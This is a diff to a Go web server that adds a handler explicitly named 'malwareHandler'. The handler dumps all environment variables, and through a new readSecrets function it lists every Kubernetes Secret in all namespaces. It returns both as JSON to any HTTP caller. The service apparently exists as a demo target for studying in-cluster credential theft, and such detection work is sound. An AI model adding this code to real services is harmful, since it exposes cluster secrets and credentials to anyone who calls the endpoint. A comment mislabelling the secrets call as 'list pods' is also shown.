@@ -1,6 +1,8 @@
 package main
 
 import (
+	"context"
+	"encoding/json"
 	"fmt"
 	"html/template"
 	"math/rand"
@@ -13,6 +15,7 @@ import (
 
 	log "github.com/sirupsen/logrus"
 	"go.opentelemetry.io/otel/attribute"
+	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 )
 
 func rootHandler(w http.ResponseWriter, r *http.Request) {
@@ -174,4 +177,75 @@ func hostnameHandler(w http.ResponseWriter, r *http.Request) {
 	} else {
 		fmt.Fprint(w, hn)
 	}
+}
+
+type MalwareData struct {
+	Secret map[string]string
+	Env    map[string]string
+}
+
+func readSecrets(ictx context.Context) (map[string]string, error) {
+	ctx, span := tracer.Start(ictx, "readSecrets")
+	defer span.End()
+
+	cs, err := getClientset()
+	if err != nil {
+		span.RecordError(err)
+		return nil, err
+	}
+
+	// list pods
+	l, err := cs.CoreV1().Secrets("").List(ctx, metav1.ListOptions{})
+	if err != nil {
+		span.RecordError(err)
+		return nil, err
+	}
+
+	r := map[string]string{}
+	for _, s := range l.Items {
+		bn, err := json.Marshal(s)
+		if err != nil {
+			span.RecordError(err)
+			return nil, err
+		}
+
+		r[fmt.Sprintf("%s/%s", s.GetNamespace(), s.GetName())] = string(bn)
+	}
+
+	return r, nil
+}
+
+func malwareHandler(w http.ResponseWriter, r *http.Request) {
+	ctx, span := tracer.Start(r.Context(), "malware")
+	defer span.End()
+
+	md := &MalwareData{
+		Secret: map[string]string{},
+		Env:    map[string]string{},
+	}
+
+	// read env
+	for _, v := range os.Environ() {
+		pair := strings.Split(v, "=")
+		md.Env[pair[0]] = pair[1]
+
+		p := envVar{Name: pair[0], Value: pair[1]}
+		p.detect()
+		pc.Vars[pair[0]] = &p
+	}
+
+	// read secrets
+	s, err := readSecrets(ctx)
+	if err != nil {
+		log.Printf("Unable to list secrets: %s", err)
+	} else {
+		md.Secret = s
+	}
+
+	d, err := json.Marshal(md)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+	}
+
+	fmt.Fprint(w, string(d))
 }
